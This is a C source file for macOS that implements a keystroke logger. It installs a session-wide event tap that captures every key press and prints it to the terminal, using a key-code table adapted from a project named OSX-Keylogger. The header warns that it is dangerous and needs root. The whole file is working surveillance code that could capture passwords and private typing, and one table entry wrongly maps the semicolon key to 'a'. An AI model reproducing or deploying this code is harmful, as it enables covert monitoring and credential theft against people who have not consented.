/*
 * Emits strings that correspond to key presses. Requires root to be useful
 * Dangerous. Use with caution.
 *
 * Jonathan Foote
 * jmfoote@loyola.edu
 *
 * see LICENSE.md for license info
 */

// Compile with:
// gcc -framework ApplicationServices -o osx osx.c
//
// Start with:
// ./osx
//
// Terminate by hitting CTRL+C

#include <ApplicationServices/ApplicationServices.h>
#include <sys/time.h>
#include <Carbon/Carbon.h>

/*
 * The table used in the function below was adapted from:
 *
 * https://github.com/mosca1337/OSX-Keylogger/blob/master/Keylogger/Keylogger.m
 *
 * and is thereby subject to the following MIT license
 *
 * The MIT License (MIT)
 *
 * Copyright (c) 2013 Patrick Mosca
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy of
 * this software and associated documentation files (the "Software"), to deal in
 * the Software without restriction, including without limitation the rights to
 * use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
 * the Software, and to permit persons to whom the Software is furnished to do so,
 * subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
 * FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
 * COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
 * IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
 * CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 */
char* convertKeyCode(int keyCode) {
    
    switch (keyCode) {
        case kVK_ANSI_A:                return "a"; break;
        case kVK_ANSI_S:                return "s"; break;
        case kVK_ANSI_D:                return "d"; break;
        case kVK_ANSI_F:                return "f"; break;
        case kVK_ANSI_H:                return "h"; break;
        case kVK_ANSI_G:                return "g"; break;
        case kVK_ANSI_Z:                return "z"; break;
        case kVK_ANSI_X:                return "x"; break;
        case kVK_ANSI_C:                return "c"; break;
        case kVK_ANSI_V:                return "v"; break;
        case kVK_ANSI_B:                return "b"; break;
        case kVK_ANSI_Q:                return "q"; break;
        case kVK_ANSI_W:                return "w"; break;
        case kVK_ANSI_E:                return "e"; break;
        case kVK_ANSI_R:                return "r"; break;
        case kVK_ANSI_T:                return "t"; break;
        case kVK_ANSI_Y:                return "y"; break;
        case kVK_ANSI_1:                return "1"; break;
        case kVK_ANSI_2:                return "2"; break;
        case kVK_ANSI_3:                return "3"; break;
        case kVK_ANSI_4:                return "4"; break;
        case kVK_ANSI_6:                return "6"; break;
        case kVK_ANSI_5:                return "5"; break;
        case kVK_ANSI_Equal:            return "="; break;
        case kVK_ANSI_9:                return "9"; break;
        case kVK_ANSI_7:                return "7"; break;
        case kVK_ANSI_Minus:            return "-"; break;
        case kVK_ANSI_8:                return "8"; break;
        case kVK_ANSI_0:                return "0"; break;
        case kVK_ANSI_RightBracket:     return "]"; break;
        case kVK_ANSI_O:                return "o"; break;
        case kVK_ANSI_U:                return "u"; break;
        case kVK_ANSI_LeftBracket:      return "["; break;
        case kVK_ANSI_I:                return "i"; break;
        case kVK_ANSI_P:                return "p"; break;
        case kVK_ANSI_L:                return "l"; break;
        case kVK_ANSI_J:                return "j"; break;
        case kVK_ANSI_Quote:            return "'"; break;
        case kVK_ANSI_K:                return "k"; break;
        case kVK_ANSI_Semicolon:        return "a"; break;
        case kVK_ANSI_Backslash:        return "\\"; break;
        case kVK_ANSI_Comma:            return ","; break;
        case kVK_ANSI_Slash:            return "/"; break;
        case kVK_ANSI_N:                return "n"; break;
        case kVK_ANSI_M:                return "m"; break;
        case kVK_ANSI_Period:           return "."; break;
        case kVK_ANSI_Grave:            return "`"; break;
        case kVK_ANSI_KeypadDecimal:    return "."; break;
        case kVK_ANSI_KeypadMultiply:   return "*"; break;
        case kVK_ANSI_KeypadPlus:       return "+"; break;
        case kVK_ANSI_KeypadClear:      return "<Clear>"; break;
        case kVK_ANSI_KeypadDivide:     return "/"; break;
        case kVK_ANSI_KeypadEnter:      return "<Enter>"; break;
        case kVK_ANSI_KeypadMinus:      return "-"; break;
        case kVK_ANSI_KeypadEquals:     return "="; break;
        case kVK_ANSI_Keypad0:          return "0"; break;
        case kVK_ANSI_Keypad1:          return "1"; break;
        case kVK_ANSI_Keypad2:          return "2"; break;
        case kVK_ANSI_Keypad3:          return "3"; break;
        case kVK_ANSI_Keypad4:          return "4"; break;
        case kVK_ANSI_Keypad5:          return "5"; break;
        case kVK_ANSI_Keypad6:          return "6"; break;
        case kVK_ANSI_Keypad7:          return "7"; break;
        case kVK_ANSI_Keypad8:          return "8"; break;
        case kVK_ANSI_Keypad9:          return "9"; break;

        case kVK_Return:                return "<Return>"; break;
        case kVK_Tab:                   return "<Tab>"; break;
        case kVK_Space:                 return "<Space>"; break;
        case kVK_Delete:                return "<Delete>"; break;
        case kVK_Escape:                return "<Escape>"; break;
        case kVK_F1:                    return "F1"; break;
        case kVK_F2:                    return "F2"; break;
        case kVK_F3:                    return "F3"; break;
        case kVK_F4:                    return "F4"; break;
        case kVK_F5:                    return "F5"; break;
        case kVK_F6:                    return "F6"; break;
        case kVK_F7:                    return "F7"; break;
        case kVK_F8:                    return "F8"; break;
        case kVK_F9:                    return "F9"; break;
        case kVK_F10:                   return "F10"; break;
        case kVK_F11:                   return "F11"; break;
        case kVK_F12:                   return "F12"; break;
        case kVK_F13:                   return "F13"; break;
        case kVK_F14:                   return "F14"; break;
        case kVK_F15:                   return "F15"; break;
        case kVK_F16:                   return "F16"; break;
        case kVK_F17:                   return "F17"; break;
        case kVK_F18:                   return "F18"; break;
        case kVK_F19:                   return "F19"; break;
        case kVK_F20:                   return "F20"; break;
        case kVK_ForwardDelete:         return "<Delete>"; break;
        case kVK_LeftArrow:             return "<Left Arrow>"; break;
        case kVK_RightArrow:            return "<Right Arrow>"; break;
        case kVK_DownArrow:             return "<Down Arrow>"; break;
        case kVK_UpArrow:               return "<Up Arrow>"; break;
           
        default:
            return "<Unknown>";
            break;
    }
}

CFMachPortRef myEventTap;

static CGEventRef myEventTapCallback (
    CGEventTapProxy proxy,
    CGEventType type,
    CGEventRef event,
    void * refcon
) {
    int key;

    // https://github.com/edvakf/macbooklog/blob/master/macbooklog.m
    // http://stackoverflow.com/questions/4727149/application-randomly-stops-receiving-key-presses-cgeventtaps
    if (type == kCGEventTapDisabledByTimeout) {
        CGEventTapEnable(myEventTap, true);
        return event;
    } else if (type == kCGEventKeyDown) {
        key = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
        printf("%s\n", convertKeyCode(key));
    }
    
    fflush(stdout);
    return event;
}


int main (
    int argc,
    char ** argv
) {
    CGEventMask emask;
    CFRunLoopSourceRef eventTapRLSrc;

    emask = CGEventMaskBit(kCGEventKeyDown);

    // Create the Tap
    myEventTap = CGEventTapCreate (
        kCGSessionEventTap, // Catch all events for current user session
        kCGTailAppendEventTap, // Append to end of EventTap list
        kCGEventTapOptionListenOnly, // We only listen, we don't modify
        emask,
        &myEventTapCallback,
        NULL // We need no extra data in the callback
    );

    // Create a RunLoop Source for it
    eventTapRLSrc = CFMachPortCreateRunLoopSource(
        kCFAllocatorDefault,
        myEventTap,
        0
    );

    // Add the source to the current RunLoop
    CFRunLoopAddSource(
        CFRunLoopGetCurrent(),
        eventTapRLSrc,
        kCFRunLoopDefaultMode
    );

    // Keep the RunLoop running forever
    CFRunLoopRun();

    // Not reached (RunLoop above never stops running)
    return 0;
}

